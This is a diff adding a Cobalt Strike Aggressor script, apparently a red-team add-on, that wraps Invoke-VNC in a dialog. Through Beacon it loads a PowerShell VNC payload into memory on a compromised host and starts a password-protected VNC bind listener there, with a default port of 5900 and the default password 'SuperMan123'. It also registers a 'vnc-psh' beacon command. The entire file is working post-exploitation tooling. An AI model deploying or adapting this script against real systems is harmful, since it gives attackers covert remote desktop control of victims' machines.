@@ -1,0 +1,42 @@
+# Provides GUI around Invoke-VNC by @artkond
+# https://github.com/artkond/Invoke-Vnc
+# 
+# Author: @vysecurity
+
+$Port = '5900';
+$Password = 'SuperMan123';
+
+sub vnc-settings {
+	$bid = $1;
+
+	$dialog = dialog("Invoke-VNC Settings", %(sPort => $Port, sPassword => $Password), lambda({
+		# save config
+		$Port = $3['sPort'];
+		$Password = $3['sPassword'];
+		if ($2 eq 'Run'){
+			btask($bid, "Injecting VNC into memory");
+			bpowershell_import($bid, script_resource("Invoke-Vnc.ps1"));
+			$command = "Invoke-Vnc -ConType bind -Port  $+ $3['sPort'] $+  -Password  $+  $3['sPassword']";
+			bpowershell($bid,$command);
+			blog($bid, "Connect to the machine on port  $+  $3['sPort']  $+  using the password:  $+  $3['sPassword']");
+		}
+	}));
+
+	dialog_description($dialog, "Specify Port and Password for VNC Bind. Make sure architecture of current PID matches OS.");
+	drow_text($dialog, "sPort", "Bind Port:");
+	drow_text($dialog, "sPassword", "Password:");
+
+	dbutton_action($dialog, "Run");
+	dbutton_action($dialog, "Cancel");
+	dialog_show($dialog);
+}
+
+# Inject VNC into memory
+alias vnc-psh{
+	vnc-settings($1);
+}
+
+beacon_command_register("vnc-psh", "Starts a VNC listener on the machine",
+	"Synopsis: vnc-psh [bind port] [password]\n\n" .
+	"Starts a VNC listener on the machine. Default Bind Port is 5900. Default password is SuperMan123\r\n" .
+	"Architecture of the current process must match the OS.");
